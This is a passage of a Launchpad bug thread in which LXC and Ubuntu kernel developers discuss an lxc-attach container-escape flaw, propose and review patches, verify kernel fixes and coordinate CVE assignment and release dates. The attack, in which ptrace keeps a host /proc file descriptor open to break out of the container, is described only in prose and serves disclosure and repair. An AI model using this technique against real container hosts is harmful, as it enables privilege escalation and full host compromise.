\* Enter the final user/mount ns as implemented now. This should work even when guest-ns is not parent of helper-ns as process is privileged in init-ns (not 100% sure about that). The helper-ns would not be the mount ns of any living process any more and should be purged, when the directory fd is closed.
\* After entering the guestns process has only limited means to modify the content in the helper-ns as it does not live in the parent-ns of the helper-ns.
Could that be a generic concept to get around the sequence of clone() calls?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#12](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/12) |
| --- | --- | --- | --- |

Maybe, but what I was worried about with this solution is that you still have /proc mounted and a process that escapes to the helper NS could then access restricted information from the init PIDNS by e.g. parsing /proc via readdir(). It's possible that I'm overthinking this though.

Maybe, but what I was worried about with this solution is that you still have /proc mounted and a process that escapes to the helper NS could then access restricted information from the init PIDNS by e.g. parsing /proc via readdir(). It's possible that I'm overthinking this though.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-08: |  |  | [#13](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/13) |
| --- | --- | --- | --- |

Well, I would not keep the whole /proc open but only the /proc/[pid] and perhaps single files from other /proc parts if needed. Then only problematic parts are root, exec, cwd, ... but after chroot those should be the same as inside the guest?

Well, I would not keep the whole /proc open but only the /proc/[pid] and perhaps single files from other /proc parts if needed. Then only problematic parts are root, exec, cwd, ... but after chroot those should be the same as inside the guest?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08:  [**Re: [Bug 1639345] Re: lxc-attach to malicious container allows access to host**](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/14) |  |  | [#14](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/14) |
| --- | --- | --- | --- |

The problem is that we don't know the PID of the attached process

beforehand, so we need to keep an fd for a clean /proc open and then

do open(/proc/self/attrc/current) and so on.

The problem is that we don't know the PID of the attached process
beforehand, so we need to keep an fd for a clean /proc open and then
do open(/proc/self/attrc/current) and so on.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-08: |  |  | [#15](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/15) |
| --- | --- | --- | --- |

Damn, that is bad. I missed this one.

Other idea: the control process stays outside the setns() and knows the PID of the child, right? Could that process open the file and send the content as message via the shared command socket? Seems less intrusive to me than adding more clone()s in the chain from control process to guest process?

Damn, that is bad. I missed this one.
Other idea: the control process stays outside the setns() and knows the PID of the child, right? Could that process open the file and send the content as message via the shared command socket? Seems less intrusive to me than adding more clone()s in the chain from control process to guest process?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#16](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/16) |
| --- | --- | --- | --- |

* [0001-attach-prevent-stealing-proc-fd-by-container.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507/%2Bfiles/0001-attach-prevent-stealing-proc-fd-by-container.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507)
  (9.6 KiB,
  text/plain)

Hm, maybe even easier: Use IPC for the child to tell us, "set up the LSM label", then parent tells the child "LSM labels setup" and then exec the attached process. I have a patch and I'll append it here because it needs to be private. Would be great if you'd test it, Roman. :)

Hm, maybe even easier: Use IPC for the child to tell us, "set up the LSM label", then parent tells the child "LSM labels setup" and then exec the attached process. I have a patch and I'll append it here because it needs to be private. Would be great if you'd test it, Roman. :)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#17](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/17) |
| --- | --- | --- | --- |

Eric's patch which Stéphane mentioned fixes the ptrace attack vector for me. The userspace part of stealing the /proc fd referring to /proc on the host is hopefully fixed by my patch.

Eric's patch which Stéphane mentioned fixes the ptrace attack vector for me. The userspace part of stealing the /proc fd referring to /proc on the host is hopefully fixed by my patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#18](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/18) |
| --- | --- | --- | --- |

Kernel to test with Eric's patch can be found here: <http://people.canonical.com/~sforshee/for-brauner/>

Kernel to test with Eric's patch can be found here: http://people.canonical.com/~sforshee/for-brauner/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#19](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/19) |
| --- | --- | --- | --- |

Fwiw, the patch to liblxc I posted should be sufficient to prevent the attack. I tested this on a kernel without the ptrace fix and it seems you won't be able to escape to the host without the proc fd anymore. Waiting on Roman to confirm this.

Fwiw, the patch to liblxc I posted should be sufficient to prevent the attack. I tested this on a kernel without the ptrace fix and it seems you won't be able to escape to the host without the proc fd anymore. Waiting on Roman to confirm this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-09: |  |  | [#20](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/20) |
| --- | --- | --- | --- |

Security team: Please assign a CVE for LXC. And please review suggested fix.

Kernel team: Please track upstream ptrace fix (will probably be worth a separate kernel CVE).

Christian: We'll need a few versions of the patch, against:

 - stable-1.0 branch

 - stable-2.0 branch (likely cherry-picks cleanly)

 - current git master (which I'm assuming is the above)

Please also do a full testsuite run on all 3 of those and confirm that there's no detected regressions.

Security team: Please assign a CVE for LXC. And please review suggested fix.
Kernel team: Please track upstream ptrace fix (will probably be worth a separate kernel CVE).
Christian: We'll need a few versions of the patch, against:
- stable-1.0 branch
- stable-2.0 branch (likely cherry-picks cleanly)
- current git master (which I'm assuming is the above)
Please also do a full testsuite run on all 3 of those and confirm that there's no detected regressions.

| Changed in lxc (Ubuntu): | |
| --- | --- |
| **status**: | New → Triaged |
| **importance**: | Undecided → Critical |
| **assignee**: | nobody → Christian Brauner (cbrauner) |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-09: |  |  | [#21](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/21) |
| --- | --- | --- | --- |

Once we all agree the suggested fix is good for this issue and we have fixes for all supported LXC releases, we can agree on a CRD and prepare packages + upstream branches for this.

Once we all agree the suggested fix is good for this issue and we have fixes for all supported LXC releases, we can agree on a CRD and prepare packages + upstream branches for this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-09: |  |  | [#22](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/22) |
| --- | --- | --- | --- |

Ok, the fix is not yet complete since you can't change aa profile for another process. It has to do it by itself which brings the procfd passing around back into play.

Ok, the fix is not yet complete since you can't change aa profile for another process. It has to do it by itself which brings the procfd passing around back into play.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-09: |  |  | [#23](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/23) |
| --- | --- | --- | --- |

* [attach: do not send procfd to attached process](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931)
  (14.5 KiB,
  text/plain)

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/23/%2Bdownload) (3.5 KiB)

I was to optimistic about the userspace fix. The fix alone might minimize the attack surface but unfortunately we seem to need the kernel fix. The child we attach in lxc-attach wants to change its LSM label appropriately right before exec() and for that it needs an fd to /proc/self/attr/current. So we seem to always have such an fd around. But what we can do is instead of passing an fd to /proc itself around, is to open up an fd to /proc/self/attr/current in the parent and send it to the child. This might minimize the attack surface but we still need the kernel fix. I post an updated version of the patch I sent before here and I'll keep thinking a little more on how we can avoid having to pass any procfd around. But I doubt it. The more complex solution I outlined above, involving a second lxc\_clone() which serves as a simple chrooting process to place is into a isolated set of namespaces is an additional attack surface minimizer. @Stéphane, do you think it be worth adding another process that chroots/minimally namspaces us before attaching to the childs namespaces?

Here's the outline of the current patch:

    So far, we opened a file descriptor refering to proc on the host inside the

    host namespace and handed that fd to the attached process in

    attach\_child\_main(). This was done to ensure that LSM labels were correctly

    setup. However, by exploiting a potential kernel bug, ptrace could be used to

    prevent the file descriptor from being closed which in turn could be used by an

    unprivileged container to gain access to the host namespace. Aside from this

    needing an upstream kernel fix, we should make sure that we don't pass the fd

    for proc itself to the attached process. However, we cannot completely prevent

    this, as the attached process needs to be able to change its apparmor profile

    by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the

    attack surface, we only send the fd for /proc/self/attr/exec or

    /proc/self/attr/current to the attached process. To do this we introduce a

    little more IPC between the child and parent:

\* IPC mechanism: (X is receiver)

             \* initial process intermediate attached

             \* X <--- send pid of

             \* attached proc,

             \* then exit

             \* send 0 ------------------------------------> X

             \* [do initialization]

             \* X <------------------------------------ send 1

             \* [add to cgroup, ...]

             \* send 2 ------------------------------------> X

             \* [set LXC\_ATTACH\_NO\_NEW\_PRIVS]

             \* X <------------------------------------ send 3

             \* [open LSM label fd]

             \* send 4 ------------------------------------> X

             \* [set LSM label]

             \* close socket close socket

             \* ...

[Read more...](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/23)

I was to optimistic about the userspace fix. The fix alone might minimize the attack surface but unfortunately we seem to need the kernel fix. The child we attach in lxc-attach wants to change its LSM label appropriately right before exec() and for that it needs an fd to /proc/self/attr/current. So we seem to always have such an fd around. But what we can do is instead of passing an fd to /proc itself around, is to open up an fd to /proc/self/attr/current in the parent and send it to the child. This might minimize the attack surface but we still need the kernel fix. I post an updated version of the patch I sent before here and I'll keep thinking a little more on how we can avoid having to pass any procfd around. But I doubt it. The more complex solution I outlined above, involving a second lxc\_clone() which serves as a simple chrooting process to place is into a isolated set of namespaces is an additional attack surface minimizer. @Stéphane, do you think it be worth adding another process that chroots/minimally namspaces us before attaching to the childs namespaces?
Here's the outline of the current patch:
So far, we opened a file descriptor refering to proc on the host inside the
host namespace and handed that fd to the attached process in
attach\_child\_main(). This was done to ensure that LSM labels were correctly
setup. However, by exploiting a potential kernel bug, ptrace could be used to
prevent the file descriptor from being closed which in turn could be used by an
unprivileged container to gain access to the host namespace. Aside from this
needing an upstream kernel fix, we should make sure that we don't pass the fd
for proc itself to the attached process. However, we cannot completely prevent
this, as the attached process needs to be able to change its apparmor profile
by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the
attack surface, we only send the fd for /proc/self/attr/exec or
/proc/self/attr/current to the attached process. To do this we introduce a
little more IPC between the child and parent:
\* IPC mechanism: (X is receiver)
\* initial process intermediate attached
\* X <--- send pid of
\* attached proc,
\* then exit
\* send 0 ------------------------------------> X
\* [do initialization]
\* X <------------------------------------ send 1
\* [add to cgroup, ...]
\* send 2 ------------------------------------> X
\* [set LXC\_ATTACH\_NO\_NEW\_PRIVS]
\* X <------------------------------------ send 3
\* [open LSM label fd]
\* send 4 ------------------------------------> X
\* [set LSM label]
\* close socket close socket
\* run program
The attached child tells the parent when it is ready to have its LSM labels set
up. The parent then opens an approriate fd for the child PID to
/proc/<pid>/attr/exec or /proc/<pid>/attr/current and sends it via SCM\_RIGHTS
to the child. The child can then set its LSM laben. Both sides then close the
socket fds and the child execs the requested process.

[Luis Henriques (henrix)](https://launchpad.net/~henrix)
on 2016-11-09

| Changed in linux (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Fix Committed |
| Changed in linux (Ubuntu Vivid): | |
| **status**: | New → Fix Committed |
| Changed in linux (Ubuntu Xenial): | |
| **status**: | New → Fix Committed |
| Changed in linux (Ubuntu Yakkety): | |
| **status**: | New → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Johansen (jjohansen)](https://launchpad.net/~jjohansen) wrote on 2016-11-09: |  |  | [#24](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/24) |
| --- | --- | --- | --- |

The kernel patch looks good to me, and I have done a first pass through the patch from comment 23 and didn't see anything of note there.

The kernel patch looks good to me, and I have done a first pass through the patch from comment 23 and didn't see anything of note there.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-14: |  |  | [#25](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/25) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-trusty' to 'verification-done-trusty'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-trusty' to 'verification-done-trusty'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-trusty |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-14: |  |  | [#26](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/26) |
| --- | --- | --- | --- |

@brauner: Can you attach patches for stable-1.0, stable-2.0 and current master?

@brauner: Can you attach patches for stable-1.0, stable-2.0 and current master?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-14: |  |  | [#27](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/27) |
| --- | --- | --- | --- |

@brauner: Can you also let Eric know that his patch does in fact seem to fix this security issue? That should motivate him in getting it pushed to stable sooner.

@brauner: Can you also let Eric know that his patch does in fact seem to fix this security issue? That should motivate him in getting it pushed to stable sooner.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-14: |  |  | [#28](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/28) |
| --- | --- | --- | --- |

Tested with Trusty kernel

pool/main/l/linux/linux-image-3.13.0-102-generic\_3.13.0-102.149\_amd64.deb

from proposed but on Xenial test machine. Tool now aborts with

"Attach failed"

no matter what is set in /proc/sys/kernel/yama/ptrace\_scope on host.

Not sure if that Trusty/Xenial cross-release check is sufficient for verification.

The Xenial kernel from proposed does not fix the issues yet (wasn't claimed in the discussion anyway)

Tested with Trusty kernel
pool/main/l/linux/linux-image-3.13.0-102-generic\_3.13.0-102.149\_amd64.deb
from proposed but on Xenial test machine. Tool now aborts with
"Attach failed"
no matter what is set in /proc/sys/kernel/yama/ptrace\_scope on host.
Not sure if that Trusty/Xenial cross-release check is sufficient for verification.
The Xenial kernel from proposed does not fix the issues yet (wasn't claimed in the discussion anyway)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-14: |  |  | [#29](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/29) |
| --- | --- | --- | --- |

@Roman: The other kernels (vivid, xenial, and yakkety) have builds with the fix in the canonical-kernel-team PPA but those builds haven't yet been copied to -proposed yet. You will see similar "This bug is awaiting verification ..." for each kernel as it reaches -proposed.

@Roman: The other kernels (vivid, xenial, and yakkety) have builds with the fix in the canonical-kernel-team PPA but those builds haven't yet been copied to -proposed yet. You will see similar "This bug is awaiting verification ..." for each kernel as it reaches -proposed.

[Joseph Salisbury (jsalisbury)](https://launchpad.net/~jsalisbury)
on 2016-11-14

| **tags**: | added: kernel-da-key |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-14: |  |  | [#30](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/30) |
| --- | --- | --- | --- |

On 11/09/2016 01:36 AM, Stéphane Graber wrote:

> Security team: Please assign a CVE for LXC. And please review suggested fix.

I think I've spotted one minor problem with the suggested fix. In

attach\_child\_main(), shutdown(ipc\_socket, SHUT\_RDWR) is not called when

lxc\_seccomp\_load() fails.

As for the CVE assignment for LXC, the Ubuntu Security Team is not

assigning CVEs at this time. Once we settle on a preferred CRD, I can

notify the linux-distros list about this issue and request a CVE at that

time.

On 11/09/2016 01:36 AM, Stéphane Graber wrote:
> Security team: Please assign a CVE for LXC. And please review suggested fix.
I think I've spotted one minor problem with the suggested fix. In
attach\_child\_main(), shutdown(ipc\_socket, SHUT\_RDWR) is not called when
lxc\_seccomp\_load() fails.
As for the CVE assignment for LXC, the Ubuntu Security Team is not
assigning CVEs at this time. Once we settle on a preferred CRD, I can
notify the linux-distros list about this issue and request a CVE at that
time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-15: |  |  | [#31](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/31) |
| --- | --- | --- | --- |

* [0001-attach-do-not-send-procfd-to-attached-process.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815)
  (14.8 KiB,
  text/plain)

Attached is a new version of the patch that adds the missing shutdown(ipc\_socket, SHUT\_RDWR) call that Tyler was pointing out.

Attached is a new version of the patch that adds the missing shutdown(ipc\_socket, SHUT\_RDWR) call that Tyler was pointing out.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-15: |  |  | [#32](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/32) |
| --- | --- | --- | --- |

Ok, so on the topic of CVE assignation, I've been going back and forth on this throughout the day.

Ultimately the security issue is with the kernel and Eric's patch fixes that, that in my mind is the real CVE worthy issue here.

On the LXC side of things, the current implementation of procfd allows an attacker to get a dirfd to the host's /proc which then allows escaping to the host's filesystem and ultimately completely escaping from the container.

Christian's fix restricts that exposure to just the apparmor label switching interface, making it still possible for an attacker in the container to alter the apparmor profile of the joining task.

That's still a security problem, but much less worse than a privileged escalation (in the case of a privileged attach process) and full container escape.

So as it stands, I think we'll want a CVE for the LXC side of this as even without the related kernel fix, the proposed fix does make things massively better by turning a privilege escalation + container escape issue into "just" an apparmor bypass issue.

As far as CRD, assuming we're all happy with the proposed fix. Anytime next week would be fine with me. If that's not an option, then the 1st or 2nd of December would work too.

I'm going to be mostly unavailable between the 28th and 30th and then again between the 5th and 9th so would rather avoid those days.

As usual, the plan will be for upstream LXC to push out security releases for the two supported branches as well as handle the announcement. So I'll be tagging LXC 1.0.9 and LXC 2.0.6 containing only this one fix on top of the latest stable release (1.0.8 and 2.0.5 respectively).

For Ubuntu, that means:

 - precise-backports: update to 1.0.9

 - trusty: update to 1.0.9

 - xenial: update to 2.0.6

 - yakkety: update to 2.0.6

 - zesty: update to 2.0.6

Once we've had a few more eyes on the proposed patch and have a CRD set in stone, I'll push all of the above in the private LXC security PPA, then on the CRD, the security team (or I) can just copy all of that stuff in the archive.

Ok, so on the topic of CVE assignation, I've been going back and forth on this throughout the day.
Ultimately the security issue is with the kernel and Eric's patch fixes that, that in my mind is the real CVE worthy issue here.
On the LXC side of things, the current implementation of procfd allows an attacker to get a dirfd to the host's /proc which then allows escaping to the host's filesystem and ultimately completely escaping from the container.
Christian's fix restricts that exposure to just the apparmor label switching interface, making it still possible for an attacker in the container to alter the apparmor profile of the joining task.
That's still a security problem, but much less worse than a privileged escalation (in the case of a privileged attach process) and full container escape.
So as it stands, I think we'll want a CVE for the LXC side of this as even without the related kernel fix, the proposed fix does make things massively better by turning a privilege escalation + container escape issue into "just" an apparmor bypass issue.
As far as CRD, assuming we're all happy with the proposed fix. Anytime next week would be fine with me. If that's not an option, then the 1st or 2nd of December would work too.
I'm going to be mostly unavailable between the 28th and 30th and then again between the 5th and 9th so would rather avoid those days.
As usual, the plan will be for upstream LXC to push out security releases for the two supported branches as well as handle the announcement. So I'll be tagging LXC 1.0.9 and LXC 2.0.6 containing only this one fix on top of the latest stable release (1.0.8 and 2.0.5 respectively).
For Ubuntu, that means:
- precise-backports: update to 1.0.9
- trusty: update to 1.0.9
- xenial: update to 2.0.6
- yakkety: update to 2.0.6
- zesty: update to 2.0.6
Once we've had a few more eyes on the proposed patch and have a CRD set in stone, I'll push all of the above in the private LXC security PPA, then on the CRD, the security team (or I) can just copy all of that stuff in the archive.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-15: |  |  | [#33](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/33) |
| --- | --- | --- | --- |

Oh, forgot trusty-backports in the list above, that'll be a backport of 2.0.6.

Oh, forgot trusty-backports in the list above, that'll be a backport of 2.0.6.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-15: |  |  | [#34](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/34) |
| --- | --- | --- | --- |

On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.

We've applied Eric's patch as the "upstream replacement" to the sauce patch we've been carrying, and it's included in the current SRU cycle, which is due to be released to -updates on Nov 28 if there are no problems.

On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.
We've applied Eric's patch as the "upstream replacement" to the sauce patch we've been carrying, and it's included in the current SRU cycle, which is due to be released to -updates on Nov 28 if there are no problems.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2016-11-16: |  |  | [#35](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/35) |
| --- | --- | --- | --- |

Patch looks good to me, thanks.

Patch looks good to me, thanks.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-16: |  |  | [#36](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/36) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-vivid' to 'verification-done-vivid'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-vivid' to 'verification-done-vivid'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-vivid |
| --- | --- |
| **tags**: | added: verification-needed-xenial |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-16: |  |  | [#37](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/37) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-xenial' to 'verification-done-xenial'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-xenial' to 'verification-done-xenial'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-16: |  |  | [#38](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/38) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-yakkety' to 'verification-done-yakkety'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-yakkety' to 'verification-done-yakkety'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-yakkety |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-16: |  |  | [#39](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/39) |
| --- | --- | --- | --- |

> On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.

Isn't that subverting the idea behind CVEs? It seems Redhat is already patched against that vulnerability:

<https://bugzilla.redhat.com/show_bug.cgi?id=1295287>

Fedora Update System 2016-02-01 01:23:43 EST

kernel-4.3.4-200.fc22 has been pushed to the Fedora 22 stable repository. If problems still persist, please make note of it in this bug report.

So basically they would have to reopen the issue and patch the same vuln again, although first patch was complete?

Or should we just accept that and wait for the first system to appear that is patched for CVE-2015-8709-A and not for CVE-2015-8709-B and then split the old entry into two?

> On the kernel side there was previously a CVE assigned for the ptrace issue - CVE-2015-8709. That restricted ptrace if the real, effective, and saved uids and gids of the process were not mapped into the ptracing process's user ns, but that doesn't forbid ptrace under the circumstances here.
Isn't that subverting the idea behind CVEs? It seems Redhat is already patched against that vulnerability:
https://bugzilla.redhat.com/show\_bug.cgi?id=1295287
Fedora Update System 2016-02-01 01:23:43 EST
kernel-4.3.4-200.fc22 has been pushed to the Fedora 22 stable repository. If problems still persist, please make note of it in this bug report.
So basically they would have to reopen the issue and patch the same vuln again, although first patch was complete?
Or should we just accept that and wait for the first system to appear that is patched for CVE-2015-8709-A and not for CVE-2015-8709-B and then split the old entry into two?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-16: |  |  | [#40](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/40) |
| --- | --- | --- | --- |

On 11/15/2016 04:59 PM, Seth Forshee wrote:

> On the kernel side there was previously a CVE assigned for the ptrace

> issue - CVE-2015-8709. That restricted ptrace if the real, effective,

> and saved uids and gids of the process were not mapped into the ptracing

> process's user ns, but that doesn't forbid ptrace under the

> circumstances here.

Please don't reuse that CVE ID for this issue. It is clearly a different

issue and reusing the CVE ID will only confuse everyone.

On 11/15/2016 04:59 PM, Seth Forshee wrote:
> On the kernel side there was previously a CVE assigned for the ptrace
> issue - CVE-2015-8709. That restricted ptrace if the real, effective,
> and saved uids and gids of the process were not mapped into the ptracing
> process's user ns, but that doesn't forbid ptrace under the
> circumstances here.
Please don't reuse that CVE ID for this issue. It is clearly a different
issue and reusing the CVE ID will only confuse everyone.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

